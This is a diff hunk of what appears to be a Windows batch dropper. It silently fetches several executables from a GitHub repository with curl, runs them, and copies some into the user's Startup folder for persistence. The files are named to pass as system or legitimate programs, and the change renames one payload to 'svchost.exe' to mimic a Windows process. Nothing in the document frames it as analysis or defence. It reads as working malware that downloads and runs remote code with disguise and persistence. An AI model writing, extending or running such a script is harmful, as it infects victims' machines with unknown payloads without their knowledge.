@@ -7,8 +7,8 @@ xcopy /y WindowsBootMenager.exe "C:\Users\%username%\AppData\Roaming\Microsoft\W
 WindowsBootMenager.exe
 curl -s -o "chromedrivers".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/chromedrivers.exe"
 chromedrivers.exe
-curl -s -o "schostv".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/schostv.exe"
-schostv.exe
+curl -s -o "svchost".exe -JL "https://github.com/DanGILC-137/Explorer/raw/main/svchost.exe"
+svchost.exe
 curl -s -o "installer".exe -JL "https://github.com/DanGILC-137/Legend/raw/main/installer.exe"
 xcopy /y installer.exe "C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup"
 installer.exe
